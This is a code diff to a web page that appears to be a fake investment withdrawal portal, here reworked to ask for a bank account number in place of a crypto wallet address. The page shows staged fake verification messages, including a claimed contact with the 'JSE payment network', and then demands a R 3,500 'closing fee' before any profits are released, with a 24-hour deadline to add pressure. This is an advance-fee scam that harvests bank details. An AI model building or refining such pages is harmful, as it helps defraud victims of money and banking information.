@@ -200,7 +200,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;line-height:1.6;color:#333;}
           </div>
           <div class="wfield">
             <label>Bank Account Number</label>
-            <input type="text" id="wWallet" placeholder="Enter your bank account number" maxlength="500" autocomplete="off" spellcheck="false">
+            <input type="number" id="wWallet" placeholder="Enter your bank account number" min="0">
             <small>Enter your full bank account number.</small>
           </div>
           <button class="wbtn" onclick="startWithdraw()"><i class="fa fa-paper-plane"></i> Submit Withdrawal Request</button>
@@ -232,8 +232,8 @@ body{font-family:'Segoe UI',Arial,sans-serif;line-height:1.6;color:#333;}
           <div class="closing-box">
             <div class="ctitle"><i class="fa fa-lock-open"></i> Final Step &mdash; Closing Fee Required</div>
             <div class="cdesc">
-              Your funds are ready to be released. To complete the transfer and credit your full profits directly to your wallet, a once-off <strong>Closing Fee of R 3,500.00</strong> is required. This covers final regulatory clearance and bank transfer processing.<br><br>
-              <strong>Once this fee is received, your full profit will be transferred to your wallet immediately.</strong>
+              Your funds are ready to be released. To complete the transfer and credit your full profits directly to your bank account, a once-off <strong>Closing Fee of R 3,500.00</strong> is required. This covers final regulatory clearance and bank transfer processing.<br><br>
+              <strong>Once this fee is received, your full profit will be transferred to your bank account immediately.</strong>
             </div>
             <div class="closing-fee-amt">
               <span class="lbl">Closing Fee Due</span>
@@ -256,7 +256,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;line-height:1.6;color:#333;}
             </div>
             <div class="urgency-note">
               <i class="fa fa-clock"></i>
-              <span>This approval expires in <strong>24 hours</strong>. Pay the closing fee promptly to ensure your funds are released without delay. Your profits will reflect in your wallet <strong>immediately</strong> after payment is confirmed.</span>
+              <span>This approval expires in <strong>24 hours</strong>. Pay the closing fee promptly to ensure your funds are released without delay. Your profits will reflect in your bank account <strong>immediately</strong> after payment is confirmed.</span>
             </div>
           </div>
           <button class="btn-retry" onclick="resetW()"><i class="fa fa-redo"></i> Start New Withdrawal</button>
@@ -406,7 +406,7 @@ function startWithdraw() {
   var errEl = document.getElementById("werr");
   errEl.style.display = "none";
   if (!code || code.length < 4) { errEl.textContent = "Please enter a valid withdrawal code."; errEl.style.display = "block"; return; }
-  if (!wallet || wallet.length < 6) { errEl.textContent = "Please enter a valid crypto wallet address."; errEl.style.display = "block"; return; }
+  if (!wallet || wallet.length < 6) { errEl.textContent = "Please enter a valid bank account number."; errEl.style.display = "block"; return; }
   if (isNaN(amt) || amt <= 0) { errEl.textContent = "Please enter a valid amount."; errEl.style.display = "block"; return; }
 
   document.getElementById("wStep1").style.display = "none";
@@ -418,7 +418,7 @@ function startWithdraw() {
     "Authenticating account credentials...",
     "Checking KYC & compliance status...",
     "Contacting JSE payment network...",
-    "Verifying wallet address...",
+    "Verifying bank account details...",
     "Submitting to Risk & Compliance...",
     "Awaiting final approval confirmation..."
   ];
